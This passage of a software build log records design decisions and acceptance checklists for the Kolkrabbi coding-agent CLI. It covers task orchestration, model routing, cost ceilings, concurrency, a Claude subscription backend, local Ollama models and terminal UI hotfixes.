changed nothing about the orchestrator's own two calls — a name meaning something other than what it
says, and the kind of gap that gets reported as "routing doesn't work".

The planner and synthesis are the orchestrator's own calls, so they take the slot. There is still no
*default*: unset, both run on the session model, which is what they have always done. Paying for a
stronger planner is cheap and probably right — it is one call and it determines more of a run's
quality than any other — but that is a judgement for the person paying, not one to make on their
behalf the first time they open the config. The doc's open question is resolved and marked as such
rather than quietly deleted.

Acceptance checklist:

- [x] the planner and synthesis use the orchestrator slot when it is set.
- [x] tasks still route by their own kind, unaffected.
- [x] with no slot set both run on the session model, as before.
- [x] the planning line shows the model actually used.
- [x] full `make check` green: 1,861 tests, 0 lint issues, every script contract.

### F14.5 concurrency — verified detail

The last leaf of phase F, and the doc named three preconditions for it — failures survivable (F14.2),
output not interleaved, permissions that do not deadlock (E13.4). All three held before this started,
which is why it is a scheduler change and not a redesign.

**Tasks run when what they need is resolved, not when their turn comes.** F14.1's `Needs` is the
graph. `resolveNeeds` only ever points backwards, so a cycle cannot be constructed and the scheduler
needs no cycle detection — it needs a loop that launches everything ready, waits for one to finish,
and sweeps again. Resolving a task *without* running it (blocked, over budget) can unblock the next
one, so the launch sweep repeats until nothing more is ready.

**Anything that may write is serialised.** They share one working tree, and two agents editing it at
once is how a run produces a state neither intended. Only `research` and `explain` are treated as
readers; **an unlabelled task counts as a writer**, which means a plan from a weaker planner stays
fully sequential — exactly today's behaviour. Concurrency arriving as a side effect of a planner
getting vaguer would be a hazard nobody chose.

**Output is buffered per task, not streamed.** Three agents streaming into one terminal is
unreadable. Each task announces itself when it starts and its output arrives whole when it finishes.
At a limit of one the writer is `a.Out` directly, so a sequential run still streams live.

Threading that writer through was most of the diff: `guard`, `subagentGuard`, `noteReachingOutside`,
`keepRule`, `executeToolWith` and `runSubagent` all wrote to `a.Out` unconditionally, so a refused
tool call in one subagent would have printed into the middle of another's output.

**The race detector found a real contract change in the test's own fake.** `Recorder` is now called
from several goroutines at once. The shipped `stats.Store` was already safe — one `O_APPEND` write
per line, atomic for a regular file across both goroutines and processes — but the interface never
said so, and `fakeRecorder` appended to a slice unguarded. The contract is now written on the
interface, which is where an implementer will look. `statsWarn` became a `sync.Once` for the same
reason.

Two existing tests needed re-scoping rather than fixing: the routing test asserted on the order
requests arrived in, which under concurrency is not a fact about routing, so it now pins the limit to
one. And I had dropped the word "subagent" from the progress lines, which an end-to-end test asserted
on — restored, because churning a user-visible contract for no reason is not a refactor.

Acceptance checklist:

- [x] independent readers overlap, verified by peak in-flight requests at the server.
- [x] never more than the limit run at once.
- [x] a task never overlaps something it declared it needs.
- [x] tasks that may write never run together.
- [x] a plan with no kinds stays fully sequential.
- [x] each task's output arrives in one piece.
- [x] failures, blocking, budget and cancellation all still behave as F14.2 and F14.4 specified.
- [x] `go test ./... -race` clean across the tree, run five times for flakiness.
- [x] full `make check` green: 1,859 tests, 0 lint issues, every script contract.

### F14.4 cost is visible and capped — verified detail

The last leaf before concurrency, and the doc's reason for that ordering: parallelism spends money
faster than anyone can read.

**An orchestrated run is the one place a single typed line becomes several dollars.** Six tasks, each
allowed a dozen tool rounds, each on whatever model F14.3 routed it to. Rounds were already capped;
rounds are not what anyone is worried about.

**Visibility is most of the value.** A ceiling only helps someone who has already decided on a
number. The running total after each task, and the run total after synthesis, are what tell everyone
else whether they should. The footer reports the synthesis call alone, so the run's real cost existed
nowhere until now.

**The ceiling stops, it does not refuse.** Remaining tasks are marked over-budget and the run
synthesises anyway: the tasks that finished cost money and are still worth delivering. Same shape as
F14.2's failures, and it reuses the same machinery — over-budget counts as a failure for the "answer
is partial" warning, and blocks anything that depended on it.

**No ceiling is not a ceiling of zero.** The default is unset, because a limit nobody chose would be
a surprise the first time it truncated real work.

**Accounted before the recorder is consulted.** `record` returns early when no stats recorder is
configured, so hooking the total after that check would have made the number silently wrong in
exactly the setups least likely to notice. What a run costs is true whether or not stats are being
written anywhere.

`spend` carries a mutex it does not yet need. F14.5 runs three tasks at once, and a counter that is
correct only while one thing is happening is a race waiting for the leaf that was always coming next.

One deviation from the hardening doc, recorded there too: the config key is flat `max_run_cost_usd`
rather than nested `orchestration.max_cost_usd`. A one-field object is clutter in a file people are
meant to open and read.

Acceptance checklist:

- [x] a run shows its running total and its final total.
- [x] a ceiling stops the remaining tasks and still produces an answer.
- [x] synthesis is told the run was cut short, naming the task that never ran.
- [x] no ceiling means the whole run proceeds however much it costs.
- [x] the ceiling is checked before spending, not after.
- [x] cost is accounted even with no stats recorder configured.
- [x] the ceiling round-trips through the config file.
- [x] full `make check` green: 1,853 tests, 0 lint issues, every script contract.

### F14.3 routing — verified detail

The point of item 14, now that a run can survive being wrong about a model.

**Two levels, kind → slot → model.** Collapsing them is what makes routing tables unmaintainable. A
user thinks "reading should be cheap", not "research and explain should both be gemini-flash"; the
slot is where that thought goes, and which kinds sit behind it can change without their config
changing.

**Nothing configured is today's behaviour.** Every kind falls through to the session model. Routing
that quietly changes what a run costs without being asked for is a surprise, not a feature, and this
is the setting most likely to be left untouched forever.

**Except boilerplate, which uses the fast lane unasked.** That lane already exists and already knows
how to pick something cheap given whether the session model is free or paid. Making someone
configure it a second time to get mechanical work off the expensive model would be a setting that
should not need to exist. It stays overridable.

**A typo is reported, not ignored.** `explorer` when the slot is `explore` means paying for the wrong
model for as long as it takes someone to notice, which on a setting nobody re-reads is indefinitely.
`ValidateSlots` names the typo and lists the four real slots, and the session says so at startup
rather than failing.

**The plan prints the model beside each task, before anything runs.** Routing that is only printed
and not applied would be worse than none, so the end-to-end test asserts on the model each request
actually carried — which needed the test server to start recording it. Resolution happens once,
before the plan is printed, so what a person reads is what runs.

Acceptance checklist:

- [x] with nothing configured every kind runs on the session model.
- [x] kinds resolve through slots; setting one slot changes one thing.
- [x] boilerplate reaches the fast lane without configuration, and is overridable.
- [x] an unknown slot name is reported with the valid ones.
- [x] the routed model is shown with the plan.
- [x] a real run sends each task to its routed model, asserted on the wire.
- [x] slots round-trip through the config file.
- [x] full `make check` green: 1,848 tests, 0 lint issues, every script contract.

### F14.2 a run survives its failures — verified detail

The change the hardening doc argued was worth the most, and the reason routing waited behind it.

**One failed subagent used to throw the whole run away.** `runOrchestrated` returned an error the
moment any subagent failed. Everything produced before it was discarded — already paid for — and the
user got an error instead of the two-thirds of an answer that existed. Now each task gets an
outcome, and the run continues.

**A task that merely ran out of rounds keeps its work.** It previously returned `""` *and* an error,
which is the worst of both: work that exists, thrown away, reported as a failure. It is now its own
status, with the last thing the subagent actually said kept as a partial result. `errRoundsExhausted`
is a distinct error precisely so the two cases can be told apart.

**A task whose dependency failed is blocked, not attempted.** F14.1's `Needs` is what makes this
sayable: running "fix it" after "find it" failed spends money on a task that cannot have the input it
declared it needed. Only failed and blocked dependencies block — an incomplete one produced
something, and a task asked for a result, not for a guarantee.

**The failures go in the synthesis prompt, not only in the terminal.** An orchestrated answer that
silently omits the third of six tasks that did not work is worse than no orchestration: the reader
cannot see the task list, so if the answer does not say what is missing, nothing does. When any task
failed the synthesis is told to say so plainly and not to present the answer as complete, and the
terminal prints how many did not finish before the answer starts.

**Cancellation is not a failure to report.** The user asked it to stop; recording every remaining
task as failed and synthesising an answer would be answering a question they withdrew. It is the one
thing that still aborts, and it returns no outcomes at all.

Two test premises of mine were wrong again, both about the fixture rather than the code: a three-task
plan silently became two because the default effort caps orchestration width at two, and the
cancellation test died inside the planner without ever reaching the branch it claimed to cover — it
now calls `runTasks` directly.

Acceptance checklist:

- [x] one failed subagent does not abort the run, and the work that succeeded reaches synthesis.
- [x] the synthesis prompt names the failed task and is told the answer is partial.
- [x] a blocked task is skipped without a request being made for it.
- [x] round exhaustion keeps its partial work and is not reported as a failure.
- [x] a run where everything failed still produces an answer that says so.
- [x] cancellation aborts and reports nothing.
- [x] failures are visible as they happen, not only in the final answer.
- [x] full `make check` green: 1,840 tests, 0 lint issues, every script contract.

### F14.1 tasks carry structure — verified detail

Phase F opened with the hardening doc (`docs/plan/14-orchestration-routing.md`), and reading
`orchestrator.go` to write it turned up the thing worth fixing first. This leaf is the prerequisite
the rest of the phase needs.

**"Comes after" and "depends on" were the same claim.** A task was a bare string, so the only
ordering information available was position, and the code implemented dependency by pasting every
earlier result into every later briefing. A plan therefore got worse as it went: the sixth
subagent's context contained five tasks' worth of output, most of it irrelevant to its own job. A
`Needs` list makes the distinction sayable, and `dependencyBriefing` hands a task only what it
declared.

**The planner is a model, so the parser accepts both shapes.** Whatever richer format we ask for, a
weaker planner will sometimes send the flat array of strings that works today, and a run must not
fail on that. A bare string yields `Kind: KindUnknown` and depends on everything before it — which
is exactly the current behaviour, so the degradation path is the status quo rather than a broken
run. This is the one place a model's reply becomes control flow; a strict parser here fails on a
stray sentence rather than on anything the user did.

**Nonsense dependencies are dropped, not repaired.** A dependency on a later task is a cycle, on a
missing task it is a briefing that would silently omit what the task asked for, and a duplicate is
one dependency however many times it was written. Guessing what the planner meant is worse than a
task running with less context than it requested, because the guess is invisible.

**An unrecognised kind stays unknown.** A task routed to the wrong model on a misread label costs
more than one routed to the default.

Two of my own premises were wrong and the code was right both times: I wrote a fixture whose
"valid" dependency was the task itself, and I generated the implicit dependency list in 0-based
indices while the planner's numbering — and therefore `resolveNeeds` — is 1-based. The second was a
real bug in new code, caught because the plain-string test asserted the exact list rather than that
it was non-empty.

Acceptance checklist:

- [x] a flat array of strings still produces a working plan with today's dependencies.
- [x] a structured plan carries kind and dependencies, and a task with none has none.
- [x] forward, missing, self and duplicate dependencies are dropped.
- [x] an unrecognised kind is left unknown rather than guessed.
- [x] the cap and the empty-title cleaning still apply.
- [x] garbage output is no plan, not a partial one.
- [x] a subagent is briefed with only the results it declared it needs.
- [x] the printed plan shows each task's kind, ready for the model to join it in F14.3.
- [x] full `make check` green: 1,834 tests, 0 lint issues, every script contract.

### B12 Claude subscription backend — recorded detail

Recorded after the fact, same correction as P11. Implemented 03:52–04:11 on 2026-08-26.

Scope:

- `internal/provider/agentcli`: invocation builder, NDJSON stream translator, provider-neutral
  result adapter, persistent `ClaudeSession`, and `ClaudeBackend`.
- `internal/shell/lines_process.go`: a persistent line-framed child process with a 1 MB scanner
  bound, stderr diagnostics, cancellation, and deterministic close.
- `internal/engine`: the `ChatBackend` seam plus `Options.Backend`, with the OpenRouter client
  unchanged as the default; `retry.go` and `fastlane.go` route through the seam.

Non-goals:

- No engine-side execution of Claude tool calls. Tool frames are display metadata only.
- No token handling: the user logs in with their own `claude` install, and Kolkrabbi spawns it.
- `--bare` is forbidden because it bypasses subscription login.

Acceptance checklist:

- [x] the translator allow-lists frame fields and scrubs text and tool input before anything reaches
  the bus or the transcript (`translate_test.go`).
- [x] one Claude process serves the whole Kolk session rather than one process per turn —
  `ClaudeBackend` holds `*ClaudeSession` behind a pointer receiver (`backend.go:35`), so the session
  survives across `StreamChat` calls. The value-receiver bug flagged in the prior session's notes is
  fixed in `9620f339`.
- [x] the CLI session owns backend lifetime and closes it exactly once (`8278dba8`, `dbfaff5b`).
- [x] **closed by B12.8:** cancellation mid-turn, EOF without a result frame, malformed frames, and
  process replacement after an unrecoverable interrupt.
- [x] **closed by B12.11:** `docs/plan/04-subscription-backends.md` now records that the
  one-process-per-turn assumption ended on 2026-08-26, and what replaced it.
- [x] **closed by B12.9:** an enabled connector now selects the backend for a new session.

### B12.7 session-scoped process lifetime — verified detail

Two defects, both of which turn the persistent Claude session into a session that dies quietly.

`getSession` started the provider process with the *turn's* context. `exec.CommandContext` kills the
child when that context is done, so the first Ctrl+C — or, in the fast lane, simply the first turn
finishing — killed Claude for the rest of the Kolkrabbi session, and `b.session` stayed non-nil so
nothing ever restarted it. That defeats the owner's explicit requirement that Claude stay alive for
the whole session.

`LinesProcess` sent its terminal error into a one-slot channel that only one caller could ever
receive. A second `Next` after the child exited, or a second `Close`, blocked forever on an empty
channel — a hung CLI with no output and no way back.

Scope:

- The session process is started on `context.WithCancel(context.WithoutCancel(ctx))`, so it is
  scoped to the backend, and `Close` releases that context after closing the session.
- `LinesProcess` records its exit once, closes an `exited` channel, and answers every later `Next`
  and `Close` from the recorded result.
- `Close` gives a provider process five seconds to exit after its stdin closes and then terminates
  it, so a CLI that ignores EOF cannot hang session teardown.

Non-goals:

- No mid-turn resynchronization or restart-after-crash policy; B12.8 owns those.

Acceptance checklist:

- [x] red first: `TestClaudeBackendSessionOutlivesOneTurnContext` failed with `context canceled`,
  and both `internal/shell` tests failed by blocking past a five-second guard.
- [x] one cancelled turn leaves the process alive, the next turn reuses it, and exactly one process
  is started per backend.
- [x] `Close` releases the process context.
- [x] repeated `Next` and repeated `Close` return the same terminal result promptly, for both a
  clean exit and a failing child.
- [x] `go test -race ./internal/shell` and the full `make check` are green.

### B12.8 interrupted-turn recovery — verified detail

Three defects, each of which shows up the first time a user presses Ctrl+C.

A turn that ended early simply returned. The provider keeps emitting the frames it had already
produced for that turn, so the *next* turn read them and answered the previous question. The test
that proves it is exact: interrupt a turn after its first frame, ask something else, and the old
answer comes back.

`LinesProcess.Next` returned `(nil, nil)` at a clean end of stream. A reader loop reads that as
"nothing yet, keep going" and spins forever on a dead process — a pegged core and a session that
never answers. End of stream is now `io.EOF`, and the earlier B12.7 test that asserted the nil-error
shape was wrong and is corrected.

A provider that quits mid-turn surfaced as the single word `EOF`. The overwhelmingly likely cause is
that the user is not signed in, which the message now says, with the command to check it.

Scope:

- `ClaudeSession.abandonTurn` drains the provider stream to the interrupted turn's completion frame
  under a five-second bound, holding the turn mutex so nothing interleaves.
- If that tail never arrives, the stream position is unknowable: the session marks itself `Unusable`
  and refuses further turns rather than guessing where the next turn begins.
- `ClaudeBackend` retires an unusable session and starts a fresh provider process for the next turn,
  so one unrecoverable interrupt does not end Claude for the whole Kolkrabbi session.
- `Next` distinguishes a clean end of stream from a failure, and a mid-turn exit is wrapped with an
  actionable explanation that still unwraps to `io.EOF`.

Non-goals:

- No resume of the interrupted turn's partial content, and no attempt to reuse a provider that lost
  its place. Correctness beats salvage here: a wrong answer attributed to the right question is
  worse than an honest restart.
- No provider-side cancellation signal. Kolkrabbi stops reading; it does not tell Claude to stop.

Acceptance checklist:

- [x] red first: the second turn after an interrupt returned `"one"`, the previous turn's answer.
- [x] after resynchronization the next turn answers its own question.
- [x] a session that cannot resynchronize reports `Unusable` and refuses the next turn with a
  message naming the interrupted turn.
- [x] the backend replaces an unusable session exactly once and the following turn succeeds.
- [x] a clean end of stream is `io.EOF`, repeatably, and never `(nil, nil)`.
- [x] a mid-turn exit explains itself and preserves the underlying cause for `errors.Is`.
- [x] `go test -race ./internal/provider/agentcli ./internal/shell ./internal/engine` green.

### B12.9 connector-to-backend selection — verified detail

Until this leaf, `internal/cli` never referenced `internal/provider/agentcli` at all. Every part of
the plan, connector, and Claude-backend work was unreachable from the product: `kolk plans login`
wrote metadata that nothing read, and the only way to reach `ClaudeBackend` was to construct
`engine.Options` in Go. The owner's actual goal — use a Claude Max subscription from inside
Kolkrabbi — did not work end to end.

Subtasks, each red first:

- **B12.9a resolution.** `provider.ResolvePlanModel` maps what the user typed to a plan model, or
  refuses with the reason: unknown reference points at `kolk pmodels`; a model offered by several
  plans asks for `<Plan>/<model>`; a model no plan can expose says so once instead of asking the
  user to choose between dead ends; a plan whose connector is not enabled prints the exact
  `kolk plans login <provider> "<Plan>"` line. `ErrNotAPlanModel` separates "ordinary model" from
  "plan model you cannot use yet".
- **B12.9b selection.** `app.planBackend` resolves the session's model against the connector
  manifest and returns `agentcli.NewClaudeBackend` for an enabled `claude` connector, `nil` for an
  ordinary model, and a named error for a connector with no adapter. `newAgent` passes it as
  `engine.Options.Backend`; `Agent.Close`, already called by `runDefault`, releases it.

Non-goals:

- No live `/model` switch onto a plan model within a running session, and no per-effort validation
  against the plan's advertised effort levels. Both are separate leaves.
- No second adapter. `codex` is enabled-but-unimplemented and says so.

Acceptance checklist:

- [x] red first: the backend was `*provider.Client` for `-m claude-opus`, and an unusable plan model
  started a session against OpenRouter instead of refusing.
- [x] an enabled connector makes `-m claude-opus` run on `*agentcli.ClaudeBackend`.
- [x] a plan model without an enabled connector refuses with the exact login command.
- [x] an ordinary model keeps the default provider client.
- [x] an enabled connector with no adapter names itself rather than silently answering elsewhere.
- [x] `internal/cli` (L6) importing `internal/provider/agentcli` (L5) satisfies the architecture
  ratchet; full `make check` green.
- [x] real-binary rehearsal in isolated directories produced both refusals verbatim.

Open UX note, not fixed here: `newAgent` still requires an OpenRouter key before anything else, so a
user whose only provider is a Claude subscription cannot start a session without also holding an
OpenRouter key. That gate predates this leaf and needs its own decision.

### B12.10 live provider switch — verified detail

`/model` set `ag.Model` and never touched `ag.Backend`. Two silent wrong-provider paths followed:
a session that switched onto a plan model kept sending it to OpenRouter, and a session already on
Claude that switched to an ordinary model kept answering from Claude while the status line named the
other model. In practice `/model claude-opus` did not even switch — the reference matched no alias
and contained no slash, so it fell through to a catalog search and printed
`could not list models: openrouter: HTTP 400`.

Scope:

- `app.switchModel` resolves the reference, moves `ag.Backend` to the plan's provider or back to the
  default client, pins the model, updates the session, and reports the plan it now runs on.
- The retired backend is closed. Nothing else would release its child process for the rest of the
  session.
- `/model` consults the plan catalog before the alias and catalog paths, so a plan model the user
  cannot use is a refusal with its reason instead of a provider error.

Non-goals:

- No validation of the active effort against the plan's advertised effort levels; that is its own
  leaf.

Acceptance checklist:

- [x] red first: the backend stayed `*provider.Client` after `/model claude-opus`, and an unusable
  plan model produced an OpenRouter HTTP 400 instead of a reason.
- [x] switching onto a plan model moves the backend and names the plan.
- [x] switching away restores the default client.
- [x] a refused switch leaves model and backend untouched.
- [x] the seven pre-existing `/model` tests still pass unchanged.
- [x] `go test -race ./internal/cli` and full `make check` green, lint 0 issues.

Refactor note: `engine.Options` is embedded in `Agent`, so `ag.Model` and `ag.Options.Model` are one
field. The first draft assigned both, which staticcheck caught; `/new` inherits the provider through
the same embedding.

### B12.11 per-turn accounting — verified detail

`docs/plan/04-subscription-backends.md` §3.3 carried a warning written before any of this shipped:

> `result` usage is cumulative across turns in `--input-format stream-json` sessions. v0.x is one
> process per turn and `--resume` starts fresh, so kolk is safe. The day anyone adopts stream-json
> input to amortise the 1–3 s of Node startup, every `EventUsage` becomes a running total and must
> be diffed — or item 17's cost chart grows quadratically.

B12.5 adopted exactly that, and nothing diffed anything. Reconciling the document surfaced the bug
it predicted, plus a second one the red test exposed immediately.

Two defects:

- **Cumulative totals recorded as per-turn.** Turn 2 would record turn 1 + turn 2, turn 3 all three.
  Summing those in `stats.jsonl` grows the reported spend quadratically in turn count.
- **Every session turn recorded `$0`.** A `result` frame emits its usage event *after* its
  completion event, and the turn loop returned the moment it saw the completion — so the frame's
  `total_cost_usd` and token counts were thrown away on every turn. Only the assistant frame's
  partial usage survived, and cost was always zero.

Scope:

- The turn loop consumes a whole frame before collecting, so a completion never truncates the frame
  that carries it.
- `ClaudeSession.chargeTurn` keeps the totals already charged and reports the difference. A report
  smaller than the running total means the provider restarted its own accounting, so kolk takes it
  at face value and rebases rather than charging a negative turn.
- The document's §3.3 hazard now records that the assumption ended, when, and what replaced it.

Non-goals:

- No cache-token accounting in `Meta`; `Collect` still drops `cache_read`/`cache_creation`.
- No change to the one-shot path, where a fresh process makes absolute totals correct already.

Acceptance checklist:

- [x] red first: the first turn reported cost `0`, proving the usage event was being dropped.
- [x] two turns against cumulative frames report 100/10/$0.10 then 150/15/$0.20.
- [x] a report smaller than the running total is taken at face value, never negative.
- [x] the one-shot backend path is unchanged and its tests pass untouched.
- [x] full `make check` green.

### B12.14 cache token accounting — verified detail

`agentcli` already parsed `cache_read_input_tokens` and `cache_creation_input_tokens` off the wire
and `Collect` threw both away, so a turn served almost entirely from cache was recorded as if every
prompt token had been paid for. On the OpenRouter side the same information arrives as
`prompt_tokens_details.cached_tokens` and was never read at all. The dashboard this feeds exists to
answer "which model earns its cost", and it could not distinguish a cache hit from a full-price call
on the same model.

Scope:

- `provider.Meta` gains `CacheReadTokens` and `CacheCreationTokens`, carried through
  `engine.CallRecord` into `stats.Record` as `cache_read_tokens` / `cache_creation_tokens`, both
  `omitempty` so providers that report nothing add nothing to the log.
- `Collect` fills them from the Claude usage event; the OpenRouter client fills the read count from
  `prompt_tokens_details`, kept as a pointer so "absent" and "reported zero" stay distinguishable.
- `chargeTurn` diffs them alongside cost and tokens: they are session-cumulative under the
  persistent process exactly like the others.

Non-goals:

- No pricing model for cached tokens. Kolkrabbi records what the provider reports; interpreting the
  discount belongs to item 17.

Acceptance checklist:

- [x] red first: `Collect` returned zero for both, and the OpenRouter stream ignored
  `prompt_tokens_details`.
- [x] a Claude turn carries both counts into `Meta`.
- [x] a second session turn reports the cache-read delta (2500 total − 1000 charged = 1500) and zero
  creation when that total did not move.
- [x] an OpenRouter usage chunk reporting 90 cached of 120 prompt tokens records 90.
- [x] `stats.jsonl` contains both fields when reported and neither when not.
- [x] full `make check` green.

### B12.12 effort within the plan — verified detail

Plan models advertise their own effort levels: Claude Pro stops at `high`, Claude Max offers `max`.
`BuildClaudeSessionArgs` passed the session's effort straight through, so `-e max` on a Pro plan sent
`--effort max` and let the provider decide what the user meant.

Scope:

- `provider.EffortForPlan` maps a requested level onto the closest one a plan offers. The dial is a
  preference, so an unavailable level steps down rather than refusing to start a session — but never
  silently, or the effort a user set means something they did not choose.
- The substitution is never more expensive than the request: when nothing at or below the requested
  level is offered, the cheapest offered level wins rather than the nearest one. A user who asked for
  `low` must not be billed for `high` because a plan starts there.
- A plan that advertises nothing, and an unset effort, both pass through untouched.
- The CLI normalizes legacy spellings (`ultra` → `max`) before the plan check, so an alias is not
  mistaken for a level no plan offers.

A second mismatch surfaced while testing this. A provider process is started with its effort and
keeps it for the life of that process, so `/effort` mid-session changed Kolkrabbi's own knobs and
reported a level the provider was not using — the same silent mismatch `/model` had before B12.10.
`/effort` now says what the provider is actually running at and how to restart it:

```
effort: low → claude-opus
claude is still running at high effort; re-run /model claude-opus to restart it at low
```

That guidance is accurate because `switchModel` passes `ag.Effort` into `planBackendFor`, so
re-selecting the model rebuilds the provider at the new level. Restarting is the user's choice
because it costs the provider's conversation state.

Non-goals:

- No automatic provider restart on `/effort`. It would silently discard the provider-side context
  the persistent session exists to keep.

Acceptance checklist:

- [x] red first: `-e max` on Claude Pro reached the provider as `max`, and `ultra` reached it
  unresolved.
- [x] a level the plan offers passes through with no message at all.
- [x] `max` on a plan that stops at `high` becomes `high` and names the substitution.
- [x] `low` against a plan starting at `medium` becomes `medium`, never `high`.
- [x] `/effort` reports the running provider's level and the exact command to restart it.
- [x] `go test -race ./internal/cli ./internal/provider/...` and full `make check` green.

### L13 managed local models — active detail

Contract: [`docs/plan/25-managed-local-models.md`](docs/plan/25-managed-local-models.md). Implemented
04:24–04:45 on 2026-08-26; L13.4 and L13.5 are still open.

Scope:

- A Kolk-owned, versioned Ollama sidecar with a private listen address and a model store below the
  Kolk data directory.
- `internal/local.Runtime` owns one sidecar for its caller's lifetime with an injected `StartFunc`,
  so no test needs an Ollama binary; `shell.StartManagedProcess` is the real starter.

Non-goals (updated 2026-08-30 — the E-group pivoted from kolk-managed to user-owned):

- **Kolk starts the user's own Ollama on PATH, lazily, and stops only that one.** E10 deleted
  the kolk-managed sidecar and the install path it owned. The architecture now wraps the existing
  Ollama.
- No implicit model pull. Every pull is an explicit, sized, confirmed user action.

Acceptance checklist:

- [x] managed storage paths land under the Kolk data directory (`8caf1e8e`).
- [x] the runtime spec validates before start, starts at most once, and closes deterministically
  (`dbf8dc4a`, `7e38af6d`).
- [x] the sidecar starter lives in `internal/shell` and keeps `os/exec` inside its one owner
  (`031b0847`).
- [x] the hardware probe returns the documented `{accelerators, system_ram_bytes, disk_free_bytes}`
  shape, fails closed to "unknown", and never lets a missing probe authorize a pull. Done:
  `NewSystemProber(...).Probe()` at `cmd_localia.go:219`.
- [x] the fit planner shows model size, required VRAM/RAM, reserved headroom, and the expected
  fallback, and refuses a pull that does not fit instead of degrading into swap. Done: `PlanFit(...)`
  at `cmd_localia.go:184`.
- [x] `/localia` and its CLI twin exist, with parity tests that need neither a GPU nor Ollama.
  Registered identically at `slash.go:31` and `cli.go:243`.

### U0.4g persistent purple composer — verified detail

Scope:

- Keep transcript, activity, slash suggestions, and the editable draft as independent screen
  regions. Anchor the composer between two full-width horizontal rules and keep session name,
  current model, effort, and working folder visible beneath it.
- Apply a purple palette only to terminal chrome and ephemeral status. Keep user input, assistant
  text, tool output, Markdown, and diffs readable without inherited color or decorative icons.
- Treat bare CR and LF as Enter while retaining the explicit Shift+Enter escape sequences for
  multiline input. Emit CRLF for each raw-terminal frame row so repaints always start at column zero.
- Remove duplicated startup metadata now owned by the persistent footer and advance release-facing
  fixtures together to strict SemVer `v1.1.5`.

Non-goals:

- No alternate screen, mouse-only interaction, engine/provider policy, automatic model switching,
  theme selector, daemon protocol, or desktop/web client.
- No octopus or repeated `thinking` label; the existing one-cell Braille spinner remains the sole
  animated activity indicator.
- No mutation of the independently owned plan/config drafts or verification notes in the shared
  working tree.

Acceptance checklist:

- [x] pure model/controller tests prove the text-only frame, purple-only chrome, persistent draft,
  two-line metadata footer, session-title refresh, slash discovery, and independent approval input.
- [x] decoder and renderer regressions fail before their fixes and pass after them for bare-LF Enter
  submission and raw-mode CRLF rows; architecture ownership passes through `internal/paths`.
- [x] a fresh real-PTY mock rehearsal submits a code turn, writes the expected file, streams tool and
  final output above the composer, updates the session title, and exits on the second Ctrl+C without
  boxed chrome, octopus, `thinking` text, duplicated startup metadata, or displaced rows.
- [x] the complete clean repository/race gate, four release archives, branch CI, signed `v1.1.5`
  assets, public updater/no-op updater, and fresh installer pass before publication is declared.

### U0.4f bounded background-output hotfix — active detail

Scope:

- Bound only the output-pipe drain after the direct shell process has exited. Keep the existing
  per-command timeout and process-group cancellation semantics unchanged while allowing deliberate
  `nohup ... &` work to continue.
- Preserve foreground output and successful exit status, then add one model-visible note explaining
  that capture detached because a background process may still be running.
- Advance the release fixtures together to strict SemVer `v1.1.4` and rehearse the real archives
  before publication.

Non-goals:

- No shorter foreground-command timeout, background job manager, daemon registry, automatic retry,
  forced teardown of a successful detached service, TUI redesign, or model-routing change.
- No mutation of the independently owned Markdown renderer or planning drafts in the shared tree.

Acceptance checklist:

- [x] the exact `cd ... && nohup ... &` compound-list regression fails before the fix and returns
  promptly after it, with foreground output, success status, and a descriptive detachment note.
- [x] focused race tests, the isolated 1,321-test full gate, five platform targets, budgets, and all
  installer/site/spec/release/workflow/verifier contracts pass; four real snapshot archives pass.
- [x] branch CI, signed `v1.1.4` release, public updater, no-op updater, and fresh installer pass.

### U0.4e spinner-only free-default patch — active detail

Scope:

- Render only the animated Braille spinner in both persistent and plain-terminal activity regions;
  keep descriptive file/command work in the durable transcript and never repeat phase labels.
- For a new session with no explicit model, query the live model catalog in intelligence order,
  prefer zero-cost tool-capable coding models, and bound discovery so startup cannot hang.
- Keep `openrouter/free` as the zero-cost catalog-outage fallback. If another provider truly lists
  no free model, select its cheapest usable coding model only with a visible pre-turn warning.
- Recognize the exact old all-tier `stealth/ox-alpha` preset documented by earlier builds and replace
  it in memory with live free discovery because that model is no longer guaranteed to cost zero.
- Advance every release-facing fixture to `v1.1.3`, rehearse `v1.1.2 → v1.1.3`, and verify the
  signed public installer/updater path before closing the leaf.

Non-goals:

- No mutation of genuinely custom model/tier configuration, resumed-session model, or explicit
  `--model`; no background model switch during a turn and no claim that free capacity is unlimited.
- No removal of durable tool descriptions, status metadata, retry policy, cost accounting, model
  catalog command, or user-controlled paid/frontier routing.
- No staging or mutation of the independently owned Markdown/diff or A7.2 work.

Acceptance checklist:

- [x] fake-clock tests prove spinner frame order and exact cleanup with no octopus, phase, tool, or
  `thinking…` text in either interactive renderer; focused race tests pass.
- [x] pure and local-HTTP tests prove free-before-paid ordering, coding/tool preference, catalog
  query filters, bounded free-router fallback, explicit override precedence, and visible paid use.
- [x] the exact former all-free preset migrates in memory while mixed/custom tier maps remain exact.
- [x] full repository gates, four-platform snapshot, live pseudo-terminal rehearsal, branch CI,
  signed `v1.1.3` release, public updater, and fresh installer all pass with evidence recorded.

### U0.3c terminal-compatible octopus hotfix — active detail

Scope:

- Reproduce the reported frame flood using Apple Terminal-compatible cursor semantics while
  preserving the already-rendered `assistant ` prefix.
- Replace the unsupported cursor save/restore pair with one supported by Apple Terminal, xterm,
  iTerm2, and the Linux console; keep cleanup exact and idempotent.
- Publish the fix as SemVer `v1.1.1`, rehearse an upgrade from `v1.1.0`, and make every current
  release-facing surface name the exact patch.

Non-goals:

- No persistent composer, alternate-screen UI, input editor, status bar, layout framework, or tool
  transcript redesign; U0.4 owns that larger Codex-style terminal surface.
- No spinner wording, frame cadence, color, activity lifecycle, provider behavior, or approval
  policy change.
- No staging or mutation of the active A7.2 scanner work or the owner's unrelated files.

Acceptance checklist:

- [x] a compatibility test reproduces the old repeated-frame line and fails only because the SCO
  `CSI s/u` cursor pair is ignored.
- [x] two rendered frames plus cleanup leave exactly the pre-existing `assistant ` prefix under
  Apple Terminal-compatible semantics, and the renderer emits no `CSI s/u` pair.
- [x] the release, installer, verifier, and website fixtures name `v1.1.1`; the installer proves a
  `v1.1.0 → v1.1.1` verified replacement and an equal-version no-download path.
- [x] focused CLI/race tests, every repository gate, and a four-platform GoReleaser snapshot pass.
- [x] only reviewed hotfix files are committed and pushed; tag `v1.1.1`, signed assets, latest
  discovery, and the public updater/install path are independently verified.
- [x] the build log records red, green, rehearsal, commit/tag, public verification, and owner
  handoff evidence.

### R1.2 v1.2.0 capability release — verified detail

Scope:

- Publish everything merged since `v1.1.14` as `v1.2.0`: sessions/context/memory (C12), the local
  dashboard (D17), tools and permissions (E13), orchestration and per-task routing (F14), the code
  and TUI surface (G11, G15), remote access (I26), and the managed local-model planner (L13).
